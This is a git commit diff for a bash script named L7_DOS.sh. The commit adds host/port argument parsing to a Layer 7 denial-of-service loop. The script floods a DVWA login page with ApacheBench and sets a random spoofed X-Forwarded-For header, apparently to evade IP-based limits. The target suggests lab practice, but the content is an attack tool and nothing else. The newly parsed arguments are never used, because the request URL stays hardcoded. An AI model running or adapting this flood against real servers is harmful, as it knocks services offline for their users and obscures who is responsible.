22f2af577c75e04dfb04965115048a2c2156b9a2
root <root@localhost.localdomain>
2021-02-17 17:26:14 +0000

    updated L7dos

--- L7_DOS.sh
+++ L7_DOS.sh
@@ -1,2 +1,15 @@
+#!/bin/bash
+display_usage() {
+	echo -e "\nUsage: $0 [host] [port]\n"
+	}
+# if less than two arguments supplied, display usage
+	if [  $# -le 1 ]
+	then
+		display_usage
+		exit 1
+	fi
+host=$1
+port=$2
+
 xff="$((RANDOM % 256))"."$((RANDOM % 256))"."$((RANDOM % 256))"."$((RANDOM % 256))"
 ab -c2 -n1000 -H "X-Forwarded-For: $xff" http://secure.dvwa.com:8081/login.php
